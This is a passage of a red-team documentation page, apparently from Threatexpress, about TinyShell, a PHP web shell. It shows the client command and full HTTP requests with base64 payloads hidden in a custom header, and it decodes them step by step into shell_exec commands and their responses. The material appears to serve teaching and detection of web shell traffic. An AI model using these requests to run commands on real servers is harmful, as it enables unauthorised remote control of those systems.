+CSRF_TOKEN: IFZvbHVtZSBpbiBkcml2ZSBDIGhhcyBubyBsYWJlbC4KIFZvbHVtZSBTZXJpYWwgTnVtYmVyIGlzIDRFNjEtM0YzMQoKIERpcmVjdG9yeSBvZiBjOlx4YW1wcFxodGRvY3NccG9ydGFsXzQ4XHVwbG9hZFx1cGxvYWRzCgoxMi8xMy8yMDE3ICAwODo0MyBQTSAgICA8RElSPiAgICAgICAgICAuCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgIDxESVI+ICAgICAgICAgIC4uCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgICAgICAgICAgICAgIDQ2IHRpbnlzaGVsbC5waHAKICAgICAgICAgICAgICAgMSBGaWxlKHMpICAgICAgICAgICAgIDQ2IGJ5dGVzCiAgICAgICAgICAgICAgIDIgRGlyKHMpICAxOSwwMDksNDQ5LDk4NCBieXRlcyBmcmVlCg== :TOKEN_CSRF
+</pre></div>
+</td></tr></table>
+
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>This is a standalone copy of TinyShell. If this was added to an existing file, the response would contain the HTML of the source page.</p>
+<p>The terms "CSRF_TOKEN:" and ":TOKEN_CSRF" are headers and footers that wrap the encoded response. These values are adjustable.</p>
+</div>
+<h4 id="decoding-the-payload">Decoding the Payload<a class="headerlink" href="#decoding-the-payload" title="Permanent link">&para;</a></h4>
+<p><strong>Base64 Payload</strong></p>
+<p><code class="codehilite">ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdaR2x5SUdNNlhIaGhiWEJ3WEdoMFpHOWpjMXh3YjNKMFlXeGZORGhjZFhCc2IyRmtYSFZ3Ykc5aFpITT0nKSAuICIgMj4mMSIpKSAuICIgOlRPS0VOX0NTUkYiKTs=</code></p>
+<p><strong>Decode Step 1</strong></p>
+<p><code class="codehilite"><span class="nt">echo</span><span class="o">(</span><span class="s2">&quot;CSRF_TOKEN: &quot;</span> <span class="o">.</span> <span class="nt">base64_encode</span><span class="o">(</span><span class="nt">shell_exec</span><span class="o">(</span><span class="nt">base64_decode</span><span class="o">(</span><span class="s1">&#39;ZGlyIGM6XHhhbXBwXGh0ZG9jc1xwb3J0YWxfNDhcdXBsb2FkXHVwbG9hZHM=&#39;</span><span class="o">)</span> <span class="o">.</span> <span class="s2">&quot; 2&gt;&amp;1&quot;</span><span class="o">))</span> <span class="o">.</span> <span class="s2">&quot; :TOKEN_CSRF&quot;</span><span class="o">);</span></code></p>
+<p><strong>Decode Step 2</strong></p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dir c:\xampp\htdocs\portal_48\upload\uploads
+</pre></div>
+</td></tr></table>
+
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>This is the command set to the TinyShell web shell.</p>
+</div>
+<h4 id="decoding-the-response">Decoding the Response<a class="headerlink" href="#decoding-the-response" title="Permanent link">&para;</a></h4>
+<p><strong>Encoded Response</strong></p>
+<p><code class="codehilite">IFZvbHVtZSBpbiBkcml2ZSBDIGhhcyBubyBsYWJlbC4KIFZvbHVtZSBTZXJpYWwgTnVtYmVyIGlzIDRFNjEtM0YzMQoKIERpcmVjdG9yeSBvZiBjOlx4YW1wcFxodGRvY3NccG9ydGFsXzQ4XHVwbG9hZFx1cGxvYWRzCgoxMi8xMy8yMDE3ICAwODo0MyBQTSAgICA8RElSPiAgICAgICAgICAuCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgIDxESVI+ICAgICAgICAgIC4uCjEyLzEzLzIwMTcgIDA4OjQzIFBNICAgICAgICAgICAgICAgIDQ2IHRpbnlzaGVsbC5waHAKICAgICAgICAgICAgICAgMSBGaWxlKHMpICAgICAgICAgICAgIDQ2IGJ5dGVzCiAgICAgICAgICAgICAgIDIgRGlyKHMpICAxOSwwMDksNDQ5LDk4NCBieXRlcyBmcmVlCg==</code></p>
+<p><strong>Decoded Response</strong></p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>This is the response rendered in the TinyShell console.</p>
+</div>
+<h2 id="header-mode">Header Mode<a class="headerlink" href="#header-mode" title="Permanent link">&para;</a></h2>
+<p>TinyShell operating in the Base64 HTTP Header Mode using PHP. Commands are sent via a HTTP HEADE.</p>
+<h3 id="shell_1">Shell<a class="headerlink" href="#shell_1" title="Permanent link">&para;</a></h3>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The "password" is set to "PSESSION". This can be changed to any value. It is referenced as "--password=" by the TinyShell client.</p>
+</div>
+<h3 id="client-command_1">Client Command<a class="headerlink" href="#client-command_1" title="Permanent link">&para;</a></h3>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>python tinyshell.py --url=http://10.203.63.80/upload/uploads/tinyshell.php--language=php --password=psession --mode=base64_header
+</pre></div>
+</td></tr></table>
+
+<h3 id="http-request-sent-by-client_1">HTTP Request Sent by Client<a class="headerlink" href="#http-request-sent-by-client_1" title="Permanent link">&para;</a></h3>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6
+7
+8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="nf">POST</span> <span class="nn">/upload/uploads/tinyshell.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">10.203.63.80</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)</span>
+<span class="na">psession</span><span class="o">:</span> <span class="l">ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdZMlE9JykgLiAiIDI+JjEiKSkgLiAiIDpUT0tFTl9DU1JGIik7</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">0</span>
+</pre></div>
+</td></tr></table>
+
+<h3 id="http-response_1">HTTP Response<a class="headerlink" href="#http-response_1" title="Permanent link">&para;</a></h3>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>HTTP/1.1 200 OK
+Date: Thu, 14 Dec 2017 02:46:56 GMT
+Server: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.5.28
+X-Powered-By: PHP/5.5.28
+Content-Length: 80
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+CSRF_TOKEN: QzpceGFtcHBcaHRkb2NzXHBvcnRhbF80OFx1cGxvYWRcdXBsb2Fkcwo= :TOKEN_CSRFPOST /upload/uploads/tinyshell.php 
+</pre></div>
+</td></tr></table>
+
+<h4 id="decoding-the-payload_1">Decoding the Payload<a class="headerlink" href="#decoding-the-payload_1" title="Permanent link">&para;</a></h4>
+<p><strong>Base64 Payload</strong></p>
+<p><code class="codehilite">ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdZMlE9JykgLiAiIDI+JjEiKSkgLiAiIDpUT0tFTl9DU1JGIik7</code></p>
+<p><strong>Decode Step 1</strong></p>
+<p><code class="codehilite"><span class="nt">echo</span><span class="o">(</span><span class="s2">&quot;CSRF_TOKEN: &quot;</span> <span class="o">.</span> <span class="nt">base64_encode</span><span class="o">(</span><span class="nt">shell_exec</span><span class="o">(</span><span class="nt">base64_decode</span><span class="o">(</span><span class="s1">&#39;Y2Q=&#39;</span><span class="o">)</span> <span class="o">.</span> <span class="s2">&quot; 2&gt;&amp;1&quot;</span><span class="o">))</span> <span class="o">.</span> <span class="s2">&quot; :TOKEN_CSRF&quot;</span><span class="o">);</span></code></p>
+<p><strong>Decode Step 2</strong></p>
+<p><code class="codehilite">cd</code></p>
+<h4 id="decoding-the-response_1">Decoding the Response<a class="headerlink" href="#decoding-the-response_1" title="Permanent link">&para;</a></h4>
+<p><strong>Encoded Response</strong></p>
+<p><code class="codehilite">QzpceGFtcHBcaHRkb2NzXHBvcnRhbF80OFx1cGxvYWRcdXBsb2Fkcwo=</code></p>
+<p><strong>Decoded Response</strong></p>
+<p><code class="codehilite">C:\xampp\htdocs\portal_48\upload\uploads</code></p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>This is the response rendered in the TinyShell console.</p>
+</div>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../redteamplanning/tradecraft/" title="Tradecraft" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Tradecraft
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../psexec/" title="PSEXEC IOCs" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                PSEXEC IOCs
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            © 2019 Threatexpress
+          </div>
+        
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../../../assets/fonts/font-awesome.css">
+    
+      <a href="https://github.com/threatexpress" class="md-footer-social__link fa fa-github"></a>
+    
+      <a href="https://twitter.com/joevest" class="md-footer-social__link fa fa-twitter"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/application.9e1f3b71.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
+      
+        <script src="https://platform.twitter.com/widgets.js"></script>
+      
+        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+      
+        <script src="../../../js/extra.js"></script>
+      
+    
+    
+      
+    
+  </body>
+</html>
